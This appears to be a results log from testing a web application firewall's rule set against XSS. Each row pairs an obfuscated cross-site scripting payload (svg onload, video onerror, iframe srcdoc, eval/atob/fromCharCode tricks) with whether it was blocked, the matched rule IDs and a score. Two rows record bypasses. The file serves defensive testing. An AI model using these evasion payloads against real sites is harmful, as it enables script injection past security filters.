175,<svg onload=(function(){eval(unescape('%61%6c%65%72%74%28%31%29'));})()>,0,1,block,8,"933160,934100,934100,934100,941100,941160,941390,949110","o24,41v221,72 || o13,11v221,72 || o13,11v221,72t:urlDecodeUni || o12,11v221,72t:removeWhitespace || v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,5v221,72t:htmlEntityDecode,t:jsDecode || ",35,176482736915.247276
176,<svg onload=(function(){window['a'+'\u006c'+'\u0065'+'\u0072'+'\u0074']('XSS')})()>,0,1,block,9,"920540,934100,934100,934100,934100,941100,941160,941370,949110","v158,10o36,6v221,83 || o13,11v221,83 || o13,11v221,83t:urlDecodeUni || o13,11v221,83t:jsDecode || o12,11v221,83t:removeWhitespace || v221,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,47v221,83t:urlDecodeUni,t:compressWhitespace || ",40,176482737240.107548
177,<svg onload=(function(){window['al'+'ert'](1);})()>,0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o13,11v221,51 || o13,11v221,51t:urlDecodeUni || o12,11v221,51t:removeWhitespace || v221,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v221,51t:urlDecodeUni,t:compressWhitespace || ",30,176482737573.368445
178,<svg onload=(function(){window[atob('YWxlcnQ=')](1);})()>,0,1,block,7,"934100,934100,941100,941160,941370,941390,949110","o13,11v221,57 || o12,11v221,57t:removeWhitespace || v221,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,24v221,57t:urlDecodeUni,t:compressWhitespace || o31,5v221,57t:htmlEntityDecode,t:jsDecode || ",30,176482737854.184016
179,<svg onload=Function('a'+'lert(1)')()>,0,1,bypass,2,"941100,941160","v220,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482738033.817188
180,"<svg onload=Function('a'+String.fromCharCode(108,101,114,116)+'(1)')()>",0,1,block,6,"934100,934100,934100,941100,941160,949110","o25,19v221,71 || o25,19v221,71t:urlDecodeUni || o23,19v221,71t:removeWhitespace || v221,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,176482738360.734785
181,<svg onload=Function('al'+'\u0065rt(1)')()>,0,1,block,4,"920540,941100,941160,949110","v158,10o27,6v220,43 || v220,43t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,43t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,176482738683.453906
182,<svg onload=Function('al'+'ert(1)')()>,0,1,bypass,2,"941100,941160","v220,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,38t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482738945.801715
183,<svg onload=Function('al'+String.fromCharCode(101)+'rt(1)')()>,0,1,block,6,"934100,934100,934100,941100,941160,949110","o26,19v221,62 || o26,19v221,62t:urlDecodeUni || o24,19v221,62t:removeWhitespace || v221,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,176482739278.096507
184,<svg onload=Function('eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)')()>,0,1,block,9,"920540,933160,934100,934100,934100,941100,941160,941390,949110","v158,10o29,6v221,73 || o20,46v221,73 || o22,5v221,73 || o22,5v221,73t:jsDecode || o21,5v221,73t:removeWhitespace || v221,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,5v221,73t:htmlEntityDecode,t:jsDecode || ",40,176482739524.502979
185,<svg onload=Function('eval(unescape(`%61%6c%65%72%74%281%29`))')()>,0,1,block,8,"933160,934100,934100,934100,941100,941160,941390,949110","o20,41v221,67 || o22,5v221,67 || o22,5v221,67t:urlDecodeUni || o21,5v221,67t:removeWhitespace || v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,5v221,67t:htmlEntityDecode,t:jsDecode || ",35,176482739793.829893
186,"<svg onload=Function('setTime'+'out(atob(""YWxlcnQoOCk=""),0)')()>",0,1,block,4,"941100,941160,941390,949110","v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,5v221,64t:htmlEntityDecode,t:jsDecode || ",15,176482740077.869184
187,"<svg onload=Function(String.fromCharCode(97,108,101,114,116,40,49,41))()>",0,1,block,5,"934100,934100,941100,941160,949110","o21,19v221,73 || o20,19v221,73t:removeWhitespace || v221,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,176482740326.767501
188,"<svg onload=Function(atob(""YWxlcnQoMSk=""))()>",0,1,block,4,"941100,941160,941390,949110","v220,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v220,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,5v220,45t:htmlEntityDecode,t:jsDecode || ",15,176482740615.716434
189,"<svg onload=setTimeout(function(){eval('al'+String.fromCharCode(101)+'rt(1)')},0)>",0,1,block,8,"933160,934100,934100,934100,941100,941160,941390,949110","o34,34v221,82 || o23,11v221,82 || o23,11v221,82t:urlDecodeUni || o22,11v221,82t:removeWhitespace || v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,11v221,82t:htmlEntityDecode,t:jsDecode || ",35,176482740931.097479
190,"<svg><animate onbegin=""this.onbegin=null;(new Function('ale'+'rt(22)')).call()""></animate></svg>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o42,13v221,96 || o42,13v221,96t:urlDecodeUni || v221,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,13v221,96t:htmlEntityDecode,t:jsDecode || ",25,176482741243.806931
191,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,10,"932235,933160,934100,934100,941100,941110,941130,941160,941390,949110","o89,8v221,174 || o100,25v221,174 || o100,5v221,174 || o98,5v221,174t:removeWhitespace || v221,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v221,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v221,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o94,5v221,174t:htmlEntityDecode,t:jsDecode || ",45,176482741596.487827
192,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>eval(atob('YWxlcnQoMSk='))</script>""></iframe></div></foreignObject></svg>",0,1,block,9,"933160,934100,934100,941100,941110,941130,941160,941390,949110","o86,25v221,160 || o86,5v221,160 || o84,5v221,160t:removeWhitespace || v221,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v221,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v221,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,5v221,160t:htmlEntityDecode,t:jsDecode || ",40,176482741725.048111
193,"<svg><image href=""#"" onerror=""Function('eval(String.fromCharCode(97,108,101,114,116,40,49,41))')()""></svg>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o38,55v221,106 || o40,5v221,106 || o38,5v221,106t:removeWhitespace || v221,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o40,5v221,106t:htmlEntityDecode,t:jsDecode || ",30,176482742050.022715
194,"<video src onerror=""new Function('al'+'ert(1)')()"">",0,1,block,6,"934100,934100,941100,941160,941390,949110","o20,13v220,51 || o20,13v220,51t:urlDecodeUni || v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,7v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o20,13v220,51t:htmlEntityDecode,t:jsDecode || ",25,17648274231.128197
195,"<video src onerror=""new Function(atob('YWxlcnQoMSk='))()"">",0,1,block,5,"934100,941100,941160,941390,949110","o20,13v220,58 || v220,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,7v220,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o20,13v220,58t:htmlEntityDecode,t:jsDecode || ",20,176482742646.789549
196,"<video src onerror='(new Function(atob(""YWxlcnQoMSk="")))()'>",0,1,block,5,"934100,941100,941160,941390,949110","o21,13v221,60 || v221,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,7v221,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,13v221,60t:htmlEntityDecode,t:jsDecode || ",20,17648274291.608588
197,<video src onerror='(new Function(atob(&#x22;YWxlcnQoMSk=&#x22;)))()'>,0,1,block,5,"934100,941100,941160,941390,949110","o21,13v221,70 || v221,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,7v221,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,13v221,70t:htmlEntityDecode,t:jsDecode || ",20,17648274326.843302
198,"<video><source onerror=""((function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41));})())""></video>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o37,53v221,107 || o26,11v221,107 || o25,11v221,107t:removeWhitespace || v221,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v221,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,5v221,107t:htmlEntityDecode,t:jsDecode || ",30,176482743483.406614
199,"<video><source onerror=""(new Function('al'+'ert(1)'))()""></video>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o25,13v221,65 || o25,13v221,65t:urlDecodeUni || v221,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v221,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,65t:htmlEntityDecode,t:jsDecode || ",25,176482743749.646925
200,"<video><source onerror='(new Function(""return a""+""lert(1)""))()' src='#'></video>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o25,13v221,80 || o25,13v221,80t:urlDecodeUni || v221,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v221,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,80t:htmlEntityDecode,t:jsDecode || ",25,176482744035.052817
